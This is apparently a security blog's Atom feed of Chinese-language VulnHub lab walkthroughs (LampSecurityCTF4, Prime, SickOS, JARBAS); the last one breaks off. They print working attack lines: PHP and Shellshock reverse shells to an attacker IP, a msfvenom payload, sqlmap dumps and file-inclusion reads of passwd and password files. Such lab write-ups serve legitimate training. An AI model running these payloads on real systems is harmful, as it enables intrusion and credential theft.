<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ljxxxxx&#39;blog</title>
  
  
  <link href="http://ljx-go.top/atom.xml" rel="self"/>
  
  <link href="http://ljx-go.top/"/>
  <updated>2023-04-08T13:52:04.680Z</updated>
  <id>http://ljx-go.top/</id>
  
  <author>
    <name>ljxxxxx</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>LampSecurityCTF4</title>
    <link href="http://ljx-go.top/2023/03/29/LampSecurityCTF4/"/>
    <id>http://ljx-go.top/2023/03/29/LampSecurityCTF4/</id>
    <published>2023-03-28T16:15:15.000Z</published>
    <updated>2023-04-08T13:52:04.680Z</updated>
    
    <content type="html"><![CDATA[<h1 id="LampSecurityCTF4"><a href="#LampSecurityCTF4" class="headerlink" title="LampSecurityCTF4"></a>LampSecurityCTF4</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p><code>sudo nmap -sn 192.168.37.0/24</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/28/image-20230328230552578.png" alt="image-20230328230552578"></p><p>主机IP：192.168.37.148</p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><code>sudo nmap --min-rate=10000 -p- 192.168.37.148</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/28/image-20230328230712302.png" alt="image-20230328230712302"></p><p><code>sudo nmap -sT -sV -O -p22,25,80,631 192.168.37.148</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/28/image-20230328230824664.png" alt="image-20230328230824664"></p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p><img src="http://42.193.172.120:8088/images/2023/03/28/image-20230328232343871.png" alt="image-20230328232343871"></p><p><code>robots.txt</code>中显示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /mail/</span><br><span class="line">Disallow: /restricted/</span><br><span class="line">Disallow: /conf/</span><br><span class="line">Disallow: /sql/</span><br><span class="line">Disallow: /admin/</span><br></pre></td></tr></table></figure><p><code>/conf/</code>访问报错,<code>/restricted/</code>,<code>/mail/</code>,<code>/admin/</code>都需要登录</p><p><code>/sql/</code>目录可以直接查看,<code>/sql/db.sql</code>可以被直接访问,内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use ehks;</span><br><span class="line">create table user (user_id int not null auto_increment primary key, user_name varchar(20) not null, user_pass varchar(32) not null);</span><br><span class="line">create table blog (blog_id int primary key not null auto_increment, blog_title varchar(255), blog_body text, blog_date datetime not null);</span><br><span class="line">create table comment (comment_id int not null auto_increment primary key, comment_title varchar (50), comment_body text, comment_author varchar(50), comment_url varchar(50), comment_date datetime not null);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&#x2F;pages是一个目录，有blog.php等文件，与前端的页面内容一致，可能存在路径穿越</p><p><img src="http://42.193.172.120:8088/images/2023/03/28/image-20230328235139390.png" alt="image-20230328235139390"></p><p><img src="http://42.193.172.120:8088/images/2023/03/28/image-20230328235201903.png" alt="image-20230328235201903"></p><h2 id="Web渗透"><a href="#Web渗透" class="headerlink" title="Web渗透"></a>Web渗透</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p><img src="http://42.193.172.120:8088/images/2023/03/28/image-20230328232318993.png" alt="image-20230328232318993"></p><p>在测试中发现sql注入点</p><p>利用sqlmap获得数据库内容</p><p><code>sqlmap -u &#39;http://192.168.37.148/index.html?page=blog&amp;title=Blog&amp;id=2&#39; --dbs --dump --batch</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/28/image-20230328234736065.png" alt="image-20230328234736065"></p><p>均可进入<code>/admin/</code>后台,测试同样可以作为ssh连接并提权到<code>root</code></p><p>在SSH连接时出现该错误，对其补足参数</p><p><code>sudo ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa,ssh-dss pmoore@192.168.37.148</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/28/image-20230329000239530.png" alt="image-20230329000239530"></p><h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p>上文提到url的访问格式是   <code>index.html?page=blog&amp;title=Blog&amp;id=2</code>推断源码为<code>include($_GET[$page].&#39;.php&#39;)</code></p><p>利用whatweb分析出其php版本为5.1.2， php版本小于5.3.4，存在%00截断</p><p><img src="http://42.193.172.120:8088/images/2023/03/28/image-20230329001412916.png" alt="image-20230329001412916"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;LampSecurityCTF4&quot;&gt;&lt;a href=&quot;#LampSecurityCTF4&quot; class=&quot;headerlink&quot; title=&quot;LampSecurityCTF4&quot;&gt;&lt;/a&gt;LampSecurityCTF4&lt;/h1&gt;&lt;h2 id=&quot;信息收集&quot;&gt;&lt;a </summary>
      
    
    
    
    
    <category term="vulnhub靶机" scheme="http://ljx-go.top/tags/vulnhub%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>Prime</title>
    <link href="http://ljx-go.top/2023/03/17/Prime/"/>
    <id>http://ljx-go.top/2023/03/17/Prime/</id>
    <published>2023-03-17T13:11:15.000Z</published>
    <updated>2023-04-08T13:52:05.287Z</updated>
    
    <content type="html"><![CDATA[<h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><blockquote><p>This machine is designed for those one who is trying to prepare for OSCP or OSCP-Exam.</p><p>This is first level of prime series. Some help at every stage is given. Machine is lengthy as OSCP and Hackthebox’s machines are designed.</p><p>So you have a target to get root flag as well as user flag. If stuck on a point some help are given at a level of enumeration. If any extra help needed</p><p>Visit our website <a href="http://hacknpentest.com/">http://hacknpentest.com</a> and <a href="http://hnpsecurity.com/">http://hnpsecurity.com</a>.</p></blockquote><p><strong>靶机IP</strong></p><p><img src="http://42.193.172.120:8088/images/2023/03/15/image-20230315130246204.png"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><p><code>sudo nmap --min-rate 10000 -p- 192.168.37.138</code></p><p><code>sudo nmap -sT -sV -O -p22,80  192.168.37.138</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/15/image-20230315130505547.png" alt="image-20230315130505547"></p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p><code>dirsearch -u 192.168.37.138 -e * -x 403</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/15/image-20230315144425580.png" alt="image-20230315144425580"></p><h4 id="x2F-dev"><a href="#x2F-dev" class="headerlink" title="&#x2F;dev"></a>&#x2F;dev</h4><p><img src="http://42.193.172.120:8088/images/2023/03/15/image-20230315144436401.png" alt="image-20230315144436401"></p><p>这是一个提示，我们通过扫描获得该提示，那说明我们再深度扫描一下</p><h4 id="x2F-wordpress-x2F-wp-login-php"><a href="#x2F-wordpress-x2F-wp-login-php" class="headerlink" title="&#x2F;wordpress&#x2F;wp-login.php"></a>&#x2F;wordpress&#x2F;wp-login.php</h4><p><img src="http://42.193.172.120:8088/images/2023/03/15/image-20230315144454527.png" alt="image-20230315144454527"></p><p>wordpress的后台登陆系统</p><h4 id="x2F-wordpress"><a href="#x2F-wordpress" class="headerlink" title="&#x2F;wordpress"></a>&#x2F;wordpress</h4><p><img src="http://42.193.172.120:8088/images/2023/03/15/image-20230315144531119.png" alt="image-20230315144531119"></p><p>wordpress框架</p><p>用dirb 再次扫描  <code>dirb http://192.168.37.138 -X .txt,.zip</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/15/image-20230315151948348.png" alt="image-20230315151948348"></p><h4 id="x2F-secret-txt"><a href="#x2F-secret-txt" class="headerlink" title="&#x2F;secret.txt"></a>&#x2F;secret.txt</h4><p><img src="http://42.193.172.120:8088/images/2023/03/15/image-20230315152030249.png" alt="image-20230315152030249"></p><p>这个提示告诉我需要对已找到的php页面进行模糊测试，找到一个正确的参数，同时这里也出现了一个location.txt需要我们去查看</p><p>其中给了个链接， 该链接是一个kali自带的用于模糊测试的工具 <code>wfuzz</code></p><p><code>dirb http://192.168.37.138 -X .php</code></p><p>寻找php页面</p><p><img src="http://42.193.172.120:8088/images/2023/03/15/image-20230315153524253.png" alt="image-20230315153524253"></p><h3 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h3><h4 id="x2F-image-php"><a href="#x2F-image-php" class="headerlink" title="&#x2F;image.php"></a>&#x2F;image.php</h4><p><img src="http://42.193.172.120:8088/images/2023/03/15/image-20230315155156090.png" alt="image-20230315155156090"></p><h4 id="x2F-index-php"><a href="#x2F-index-php" class="headerlink" title="&#x2F;index.php"></a>&#x2F;index.php</h4><p><img src="http://42.193.172.120:8088/images/2023/03/15/image-20230315155244206.png" alt=" "></p><p>获得参数file</p><p>访问file</p><p><img src="http://42.193.172.120:8088/images/2023/03/15/image-20230315160546053.png" alt="image-20230315160546053"></p><p>提示参数的内容不正确，尝试前面提示的location.txt文件</p><p><img src="http://42.193.172.120:8088/images/2023/03/15/image-20230315161439318.png" alt="image-20230315161439318"></p><p>出现另一个参数<code>secrettier360</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/15/image-20230315161822628.png" alt="image-20230315161822628"></p><p>该参数是image.php上的参数，这里应该是一个本地文件包含漏洞</p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p><code>curl  http://192.168.37.138/image.php?secrettier360=../../../../../../etc/passwd</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/21/image-20230321144624395.png" alt="image-20230321144624395"></p><p>根据提示查看password.txt文件</p><p><code>curl  http://192.168.37.138/image.php?secrettier360=../../../../../../home/saket/password.txt</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322185944244.png" alt="image-20230322185944244"></p><p>拿到一个密码 follow_the_ippsec，尝试ssh连接，均失败。</p><h2 id="Wordpress"><a href="#Wordpress" class="headerlink" title="Wordpress"></a>Wordpress</h2><blockquote><p><strong>WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。</strong></p></blockquote><p><code>wpscan --url http://192.168.37.138/wordpress -e u</code></p><p>已知一个密码，此时思路是-e参数枚举wordpress后台用户名，获得用户名victor</p><p><img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322194728822.png" alt="image-20230322194728822"></p><p>成功登陆</p><p><img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322195639260.png" alt="image-20230322195639260"></p><p>登陆wordpress后台后，通常的思路是查看Plugins是否允许插入插件orAppearance&#x2F;Theme Editor处是否有可写权限的脚本文件</p><p>创建一个zip文件尝试上传，此路不通</p><p><img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322201902573.png" alt="image-20230322201902573"></p><p>在Theme Editor发现可修改secret.php文件，写入一句话木马反弹shell</p><p><img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322202228133.png" alt="image-20230322202228133"></p><p><code>&lt;?php &quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.37.135/7777 0&gt;&amp;1&#39; &quot;?&gt;</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322202729914.png" alt="image-20230322202729914"></p><p>接下来就是寻找secret.php文件的路径</p><blockquote><p>WordPress主题存放在 “wp-content&#x2F;themes&#x2F;” 这个文件夹中，我们可以看到各自默认有几个主题文件夹，里面包含了所有的主题目录，并存储为一个目录。每个目录名称通常是一个主题名称。如果我们有需要添加新主题可以将主题的文件夹传到这个目录，然后在后台的外观主题可以激活设置当前主题。</p></blockquote><p>&#x2F;wp-content&#x2F;themes&#x2F;twentynineteen&#x2F;secret.php </p><p><img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322203406131.png" alt="image-20230322203406131"></p><p>得到反弹shell</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322203854460.png" alt="image-20230322203854460"></p><p>提示了&#x2F;home&#x2F;saket&#x2F;目录</p><p>user.txt中存放密文，用md5解密无果，enc是一个可执行文件，执行时需要输入密码</p><p><img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322213605210.png" alt="image-20230322213605210"></p><p>此处我们可以通过find命令搜索backup文件  （backup文件会有一些关键信息）</p><p><code>find / -name &#39;*backup*&#39; 2&gt;/dev/null | sort | less</code></p><blockquote><p>忽略错误输出 使用“2&gt;&#x2F;dev&#x2F;null”将错误信息输出到“&#x2F;dev&#x2F;null”设备中，从而忽略错误输出。</p><p>在Linux系统中，每个进程都有三个标准文件描述符：标准输入（stdin）、标准输出（stdout）和标准错误（stderr）。这些文件描述符分别对应于文件描述符0、1和2。</p><p>当我们使用Linux命令时，它们通常会将标准输出和标准错误分别输出到终端，以便我们可以看到它们的输出结果。但是，有时候我们可能不希望看到标准错误的输出信息，可以通过将标准错误输出重定向到“&#x2F;dev&#x2F;null”设备中，从而将其忽略掉。</p><p>在命令中，“2”代表标准错误的文件描述符，”&gt;”代表重定向操作符，”&#x2F;dev&#x2F;null”代表一个特殊的设备文件，用于将所有数据丢弃而不保存。</p><p>因此，使用“2&gt;&#x2F;dev&#x2F;null”将错误信息输出到“&#x2F;dev&#x2F;null”设备中的意思是将标准错误输出重定向到“&#x2F;dev&#x2F;null”设备中，从而将其忽略掉。</p></blockquote><p>找到opt&#x2F;backup&#x2F;server_database&#x2F;backup_pass<img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322214027888.png" alt="image-20230322214027888"></p><p>获得 密码：<strong>backup_password</strong></p><p>成功运行enc文件生成密钥密文文件</p><p><img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322214218148.png" alt="image-20230322214218148"></p><p><img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322214602948.png" alt="image-20230322214602948"></p><p>提示用md5加密ippsec作为密码解密enc.txt</p><p><img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322214548296.png" alt="image-20230322214548296"></p><p><strong>366a74cb3c959de17d61db30591c39d1</strong></p><p>此处也可以用echo与md5sum进行md5加密——但要注意需要-n来取消字符串的换行符，否则加密会有误</p><p><img src="http://42.193.172.120:8088/images/2023/03/27/image-20230328010851938.png" alt="image-20230328010851938"></p><p>利用openssl解密</p><p><img src="http://42.193.172.120:8088/images/2023/03/28/image-20230328201505755.png" alt="image-20230328201505755"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in $(cat txt);do echo &#x27;nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=&#x27; | openssl enc -d -a -K &#x27;33363661373463623363393539646531376436316462333035393163333964310a&#x27; -$i 2&gt;/dev/null; echo $i; done</span><br></pre></td></tr></table></figure><p><img src="http://42.193.172.120:8088/images/2023/03/28/image-20230328203725787.png" alt="image-20230328203725787"></p><p>最后解密的saket用户的密码为tribute_to_ippsec</p><p>切换账户并查看权限<img src="/2023/03/17/Prime/Users\ljx\AppData\Roaming\Typora\typora-user-images\image-20230322215242922.png" alt="image-20230322215242922"></p><p>执行提示的文件 &#x2F;home&#x2F;victor&#x2F;undefeated_victor<img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322215223805.png" alt="image-20230322215223805"></p><p>提示没找到challenge文件，尝试创建challenge文件并写入“&#x2F;bin&#x2F;bash”</p><p><img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322215551337.png" alt="image-20230322215551337"></p><p>成功获得root权限</p><p><img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322215633795.png" alt="image-20230322215633795"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;靶机介绍&quot;&gt;&lt;a href=&quot;#靶机介绍&quot; class=&quot;headerlink&quot; title=&quot;靶机介绍&quot;&gt;&lt;/a&gt;靶机介绍&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;This machine is designed for those one who is try</summary>
      
    
    
    
    
    <category term="vulnhub靶机" scheme="http://ljx-go.top/tags/vulnhub%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>SickOS</title>
    <link href="http://ljx-go.top/2023/03/15/SickOS/"/>
    <id>http://ljx-go.top/2023/03/15/SickOS/</id>
    <published>2023-03-14T16:51:15.000Z</published>
    <updated>2023-04-08T13:52:05.979Z</updated>
    
    <content type="html"><![CDATA[<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ABOUT RELEASE</span><br><span class="line">Name........: SickOs1.1</span><br><span class="line">Date Release: 11 Dec 2015</span><br><span class="line">Author......: D4rk</span><br><span class="line">Series......: SickOs</span><br><span class="line">Objective...: Get /root/a0216ea4d51874464078c618298b1367.txt</span><br><span class="line">Tester(s)...: h1tch1</span><br><span class="line">Twitter.....: https://twitter.com/D4rk36</span><br></pre></td></tr></table></figure><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><p>IP地址 192.168.37.140</p><img src="http://42.193.172.120:8088/images/2023/03/12/image-20230312222911204.png" alt="image-20230312222911204" style="zoom: 67%;"><h4 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h4><p><img src="http://42.193.172.120:8088/images/2023/03/12/image-20230312224029714.png" alt="image-20230312224029714"></p><p><img src="http://42.193.172.120:8088/images/2023/03/12/image-20230312224236606.png" alt="image-20230312224236606"></p><p>发现端口22 3128 8080</p><p>其中8080端口未开启</p><p>经过两次nmap漏洞扫描并未发现其他信息</p><p><img src="http://42.193.172.120:8088/images/2023/03/12/image-20230312224524062.png" alt="image-20230312224524062"></p><p>访问3128端口与8080端口结果如下</p><img src="http://42.193.172.120:8088/images/2023/03/12/image-20230312225858677.png" alt="image-20230312225858677" style="zoom:67%;"><img src="http://42.193.172.120:8088/images/2023/03/12/image-20230312225908889.png" alt="image-20230312225908889" style="zoom:67%;"><p>结果都显示3128端口的服务框架为squid，上网搜寻squid的相关信息</p><blockquote><p><a href="https://www.open-open.com/misc/goto?guid=4958185427613467036">Squid cache</a>（简称为Squid）是一个流行的自由软件（GNU通用公共许可证）的代理服务器和Web缓存服务器。Squid有广泛的用途，从作为网页服务器的前置cache服务器缓存相关请求来提高Web服务器的速度，到为一组人共享网络资源而缓存万维网，域名系统和其他网络搜索，到通过过滤流量帮助网络 安全，到局域网通过DL上网。Squid主要设计用于在Unix一类系统运行。</p></blockquote><p>在此猜测，访问80端口须走3128端口代理</p><h3 id="Squid代理设置"><a href="#Squid代理设置" class="headerlink" title="Squid代理设置"></a>Squid代理设置</h3><p>通过这个思路 我们可以对靶机进行目录爆破 在爆破的同时加入代理服务器</p><img src="http://42.193.172.120:8088/images/2023/03/12/image-20230313003151041.png" alt="image-20230313003151041" style="zoom:67%;"><p>通过浏览器访问前设置proxy代理</p><img src="http://42.193.172.120:8088/images/2023/03/12/image-20230313003529361.png" alt="image-20230313003529361" style="zoom:50%;"><h3 id="Web服务"><a href="#Web服务" class="headerlink" title="Web服务"></a>Web服务</h3><p>访问robots.txt</p><p><img src="http://42.193.172.120:8088/images/2023/03/12/image-20230313003627827.png" alt="image-20230313003627827"></p><p>访问&#x2F;wolfcms目录</p><img src="http://42.193.172.120:8088/images/2023/03/12/image-20230313003729450.png" alt="image-20230313003729450" style="zoom:67%;"><p>通过谷歌关键词搜索后台登陆地址</p><p><img src="http://42.193.172.120:8088/images/2023/03/12/image-20230313011138489.png" alt="image-20230313011138489"></p><p>成功访问后台登陆地址，是一个登陆界面。面对该登陆界面有以下三种思路</p><ul><li>1.弱密码</li><li>2.默认账号</li><li>3.暴力破解</li></ul><p><img src="http://42.193.172.120:8088/images/2023/03/12/image-20230313011207583.png" alt="image-20230313011207583"></p><p>经过弱密码尝试后，用 <code>admin/admin</code>成功登陆</p><p><img src="http://42.193.172.120:8088/images/2023/03/13/image-20230314003826611.png" alt="image-20230314003826611"></p><p>发现有很多文件内容都是用php脚本来执行，同时也存在文件上传的入口</p><p><img src="http://42.193.172.120:8088/images/2023/03/13/image-20230314003944203.png" alt="image-20230314003944203"></p><p><img src="http://42.193.172.120:8088/images/2023/03/13/image-20230314004000255.png" alt="image-20230314004000255"></p><p>尝试在Articles中插入一句话木马。</p><p><code>&lt;?php exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.37.135/7777 0&gt;&amp;1&#39;&quot;);?&gt;</code></p><p>在点击Articles时成功反弹shell</p><p><img src="http://42.193.172.120:8088/images/2023/03/13/image-20230314004524690.png" alt="image-20230314004524690"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>查看网站配置文件config.php</p><p><img src="http://42.193.172.120:8088/images/2023/03/13/image-20230314005652091.png" alt="image-20230314005652091"></p><p>获得数据库账号密码 <code>root/john@123</code></p><p>查看&#x2F;etc&#x2F;passwd文件，获得靶机的相关用户及其权限</p><p><img src="http://42.193.172.120:8088/images/2023/03/13/image-20230314103710896.png" alt="image-20230314103710896"></p><p>尝试用着数据库的账号密码 对靶机ssh连接</p><p><img src="http://42.193.172.120:8088/images/2023/03/13/image-20230314103909232.png" alt="image-20230314103909232"></p><p>成功ssh连接获得sickos账户</p><p><img src="http://42.193.172.120:8088/images/2023/03/13/image-20230314103954962.png" alt="image-20230314103954962"></p><p><img src="http://42.193.172.120:8088/images/2023/03/13/image-20230314105247196.png" alt="image-20230314105247196"></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>利用Nikto 发现shellshock漏洞</p><p><a href="https://blog.csdn.net/smli_ng/article/details/105994754">Nikto详细使用教程</a></p><blockquote><p><strong>nikto常用命令</strong><br>-upodate                           升级，更新插件</p><p>-host                                  扫描目标URl</p><p>-id username:password   http认证接口</p><p>-list-plugins                      列出所有可用的插件</p><p>-evasion                          IDS&#x2F;IPS逃避技术（实例演示里有详细信息）</p><p>-port                                指定端口（默认80）</p><p> -ssl                                 使用SSL</p><p>-useproxy                       使用http代理</p><p>-vhost  域名                    当一个IP拥有多个网站时 使用</p><p><strong>nikto交互参数（扫描过程中使用）</strong><br>空格        报告当前扫描状态</p><p>v             显示详细信息</p><p>d             显示调试信息</p><p>e             显示http错误信息</p><p>p             显示扫描进度</p><p>r              显示重定向信息</p><p>c             显示cookie</p><p>a             显示身份认证过程</p><p>q             退出程序</p><p>N            扫描下一个目标</p><p>P            暂停扫描</p></blockquote><p><code>nikto -h 192.168.37.140 -useproxy 192.168.37.140:3128</code>    注意此处需要挂代理</p><p><img src="http://42.193.172.120:8088/images/2023/03/14/image-20230314235545518.png" alt="image-20230314235545518"></p><blockquote><p><strong>漏洞原因</strong></p><p>bash使用的环境变量是通过函数名称来调用的，以”<code>()&#123;</code>“开头通过环境变量来定义，而在处理这样的恶意的函数环境变量时，并没有以函数结尾 “<code>&#125;</code>” 为结束，而是执行其后的恶意shell命令</p></blockquote><p><strong>检查漏洞</strong></p><p><code>curl --proxy http://192.168.37.140:3128 -v -A &quot;() &#123; :;&#125;;echo;/usr/bin/whoami&quot; http://192.168.37.140/cgi-bin/status</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/14/image-20230315000417335.png" alt="image-20230315000417335"></p><p><strong>反弹shell</strong></p><p><code>curl --proxy http://192.168.37.140:3128 -v -A &quot;() &#123; :; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/192.168.37.135/7777 0&gt;&amp;1&quot; http://192.168.37.140//cgi-bin/status</code></p><blockquote><p>小tips</p><p>当获得的shell的交互性比较差可以用使用 python 的 pty 来转换为 交互式shell</p><p><code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p></blockquote><p><strong>查看网站根目录文件</strong></p><p><img src="http://42.193.172.120:8088/images/2023/03/14/image-20230315002609547.png" alt="image-20230315002609547"></p><p>通过查看定时任务cron提权  </p><p><img src="http://42.193.172.120:8088/images/2023/03/14/image-20230315003441880.png" alt="image-20230315003441880"></p><p>在过滤关键字cron中获得多个定时任务有关的文件夹，其中在cron.d中的automate中发现存在一个定时任务每个一分钟执行网站根目录下的python文件，因此可以通过执行python脚本来反弹shell，进一步提权</p><p>使用msfvenom生成shell</p><p><a href="https://blog.51cto.com/yyxianren/5720367">msfvenom参数简介</a>    <a href="https://blog.csdn.net/m0_64444909/article/details/126841128">利用msfvenom制作木马，并且反弹shell</a></p><p><code>msfvenom -p cmd/unix/reverse_python LHOST=192.168.37.135 LPORT=7778 -f raw</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/14/image-20230315004656083.png" alt="image-20230315004656083"></p><p><img src="http://42.193.172.120:8088/images/2023/03/14/image-20230315004806042.png" alt="image-20230315004806042"></p><p>成功获得目标！！！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;描述&quot;&gt;&lt;a href=&quot;#描述&quot; class=&quot;headerlink&quot; title=&quot;描述&quot;&gt;&lt;/a&gt;描述&lt;/h3&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;s</summary>
      
    
    
    
    
    <category term="vulnhub靶机" scheme="http://ljx-go.top/tags/vulnhub%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>JARBAS</title>
    <link href="http://ljx-go.top/2023/03/11/JARBAS/"/>
    <id>http://ljx-go.top/2023/03/11/JARBAS/</id>
    <published>2023-03-11T15:40:15.000Z</published>
    <updated>2023-04-08T13:52:03.998Z</updated>
    
    <content type="html"><![CDATA[<h2 id="靶场介绍"><a href="#靶场介绍" class="headerlink" title="靶场介绍"></a>靶场介绍</h2><p>靶机名：JARBAS</p><p>Jarbas靶场下载地址: <a href="https://download.vulnhub.com/jarbas/Jarbas.zip">https://download.vulnhub.com/jarbas/Jarbas.zip</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>靶机IP地址 192.168.37.139</p><p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230309210231914.png" alt="image-20230309210231914"></p><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><p><code>nmap --min-rate 10000 -p- 192.168.37.139</code></p><p>两次扫描有不同的结果 因此我们尽量在扫描时重复一次 防止端口漏扫</p><p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230309222737897.png" alt="image-20230309222737897"></p><p>查询端口服务对应的版本</p><p><code>nmap -sT -sV -O -p22,80,3306,8080 192.168.37.139</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230309223124729.png" alt="image-20230309223124729"></p><p><code>nmap -sU -p22,80,3306,8080 192.168.37.139</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230309223208609.png" alt="image-20230309223208609"></p><p>nmap漏洞扫描</p><p><code>nmap --script=vuln -p22,80,3306,8080 192.168.37.139</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230309223711562.png" alt="image-20230309223711562"></p><p>在80端口中发现潜在的目录列表 &#x2F;icons</p><p>在8080端口中发现&#x2F;robots.txt文件</p><p>访问80端口web服务</p><p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230310004017066.png" alt="image-20230310004017066"></p><p>访问8080端口</p><p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230310003928522.png" alt="image-20230310003928522"></p><p>疑似后台登陆账密</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p><code>dirsearch -u 192.168.37.139 -x 403</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230310001619389.png" alt="image-20230310001619389"></p><p>访问access.html</p><p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230310003639361.png" alt="image-20230310003639361"></p><p>一眼md5加密  